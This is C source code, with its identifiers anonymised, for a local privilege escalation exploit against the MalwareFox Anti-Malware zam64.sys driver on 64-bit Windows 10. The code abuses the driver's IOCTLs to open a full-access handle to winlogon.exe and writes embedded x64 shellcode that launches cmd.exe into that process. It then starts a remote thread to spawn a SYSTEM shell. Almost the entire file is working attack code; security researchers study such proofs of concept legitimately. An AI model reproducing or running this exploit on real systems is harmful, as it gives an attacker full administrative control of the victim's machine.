
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int buf ;
typedef int LPVOID ;
typedef scalar_t__ HANDLE ;
typedef int DWORD ;


 scalar_t__ FUNC_0 (char*,int,int ,int *,int ,int ,int *) ;
 int FUNC_1 (scalar_t__,int *,int ,int ,int *,int ,int *) ;
 int FUNC_2 (scalar_t__,int,int *,int,scalar_t__*,int,int *,int *) ;
 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_3 () ;
 scalar_t__ VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int FUNC_4 (scalar_t__) ;
 int FUNC_5 (scalar_t__,int *,int,int,int ) ;
 int FUNC_6 (scalar_t__,int ,unsigned char*,int,int *) ;
 int FUNC_7 (char*) ;

int FUNC_8(int VAR_8, char** VAR_9)
{
 DWORD VAR_10;
 DWORD VAR_11;
 HANDLE VAR_12;
 LPVOID VAR_13;
 HANDLE VAR_14;

 FUNC_7("===      MalwareFox Anti-Malware 2.74.0.150 zam64.sys Local Privilege Escalation      ===\n");
 FUNC_7("                              Tested on Windows 10 64-bit                                \n");
 FUNC_7("                                   Souhail Hammou                                      \n\n");
 FUNC_7("[*] Stage 1: Registering the process with the driver by sending IOCTL 0x80002010\n");

 VAR_14 = FUNC_0
  ("\\\\.\\ZemanaAntiMalware",
   VAR_1 | VAR_2,
   0,
   ((void*)0),
   VAR_6,
   VAR_0,
   ((void*)0)
   );
 if (VAR_14 == VAR_3)
 {
  return 0;
 }


 if (!FUNC_4(VAR_14))
 {
  FUNC_7("\t[-] Registration Failed !\n");
  return 0;
 }

 FUNC_7("\t[+] Process registered.\n[*] Stage 2: \n");

 FUNC_7("\t[+] Getting Winlogon's PID\n");
 VAR_11 = FUNC_3();

 if (!VAR_11)
 {
  FUNC_7("\t[-] GetWinlogonPID() failed !\n");
  return 0;
 }

 FUNC_7("\t[+] (IOCTL) Opening a full access, user-mode accessible handle from kernel-mode to winlogon\n");






 if (!FUNC_2(VAR_14, 0x8000204C, &VAR_11, sizeof(DWORD), &VAR_12, sizeof(HANDLE), &VAR_10, ((void*)0)))
 {
  FUNC_7("\t[-] DeviceIoControl 0x8000204C failed !\n");
  return 0;
 }

 FUNC_7("\t[+] Allocating executable memory in winlogon.exe using the full access handle\n");

 if (!(VAR_13 = FUNC_5(VAR_12, ((void*)0), 0x1000, VAR_5 | VAR_4, VAR_7)))
 {
  FUNC_7("\t[-] VirtualAllocEx failed !\n");
  return 0;
 }

 FUNC_7("\t[+] Writing shellcode to allocated memory\n");


 unsigned char VAR_15[] =
  "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
  "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
  "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
  "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
  "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
  "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
  "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
  "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
  "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
  "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
  "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
  "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
  "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
  "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
  "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
  "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
  "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
  "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
  "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
  "\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00";

 if (!FUNC_6(VAR_12, VAR_13, VAR_15, sizeof(VAR_15), &VAR_10))
 {
  FUNC_7("\t[-] WriteProcessMemory Failed !\n");
  return 0;
 }

 FUNC_7("\t[+] Spawning SYSTEM shell\n");
 if (!FUNC_1(VAR_12, ((void*)0), 0, VAR_13, ((void*)0), 0, ((void*)0)))
 {
  FUNC_7("\t[-] CreateRemoteThread Failed! Did you compile the exploit as a 64-bit executable ?\n");
  return 0;
 }
}
